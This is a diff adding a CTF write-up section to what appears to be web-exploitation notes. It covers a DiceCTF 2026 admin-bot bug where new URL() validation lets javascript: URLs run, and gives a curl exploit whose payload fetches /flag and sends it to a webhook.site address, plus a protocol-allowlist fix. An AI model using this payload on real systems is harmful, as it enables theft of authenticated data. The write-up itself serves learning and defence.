@@ -20,6 +20,7 @@
 - [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
 - [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
 - [JSFuck Decoding](#jsfuck-decoding)
+- [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
 
 ---
 
@@ -294,3 +295,46 @@ const code = fs.readFileSync('jsfuck.js', 'utf8');
 const func = eval(code.slice(0, -2));
 console.log(func.toString());  // Reveals original code with hardcoded flag
 ```
+
+---
+
+## Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)
+
+**Pattern (Mirror Temple):** Admin bot navigates to user-supplied URL, validates with `new URL()` which only checks syntax — not protocol scheme. `javascript:` URLs pass validation and execute arbitrary JS in the bot's authenticated context.
+
+**Vulnerable validation:**
+```javascript
+try {
+  new URL(targetUrl)   // Accepts javascript:, data:, file:, etc.
+} catch {
+  process.exit(1)
+}
+await page.goto(targetUrl, { waitUntil: "domcontentloaded" })
+```
+
+**Exploit:**
+```bash
+# 1. Create authenticated session (bot requires valid cookie)
+curl -i -X POST 'https://target/postcard-from-nyc' \
+  --data-urlencode 'name=test' \
+  --data-urlencode 'flag=dice{test}' \
+  --data-urlencode 'portrait='
+# Extract save=... cookie from Set-Cookie header
+
+# 2. Submit javascript: URL to report endpoint
+curl -X POST 'https://target/report' \
+  -H 'Cookie: save=YOUR_COOKIE' \
+  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
+```
+
+**Why CSP/SRI don't help (B-Side variant):** The B-Side adds inlined CSS, SRI integrity hashes on scripts, and strict CSP. None of these matter because `javascript:` URLs execute in a **navigation context** — the bot navigates to the JS URL directly, not injecting into an existing page. The CSP of the target page is irrelevant since the JS runs before any page loads.
+
+**Fix:**
+```javascript
+const u = new URL(targetUrl)
+if (!['http:', 'https:'].includes(u.protocol)) {
+  process.exit(1)
+}
+```
+
+**Key insight:** `new URL()` is a **syntax** validator, not a **security** validator. It accepts `javascript:`, `data:`, `file:`, `blob:`, and other dangerous schemes. Any admin bot or SSRF handler using `new URL()` alone for validation is vulnerable. Always allowlist protocols explicitly.
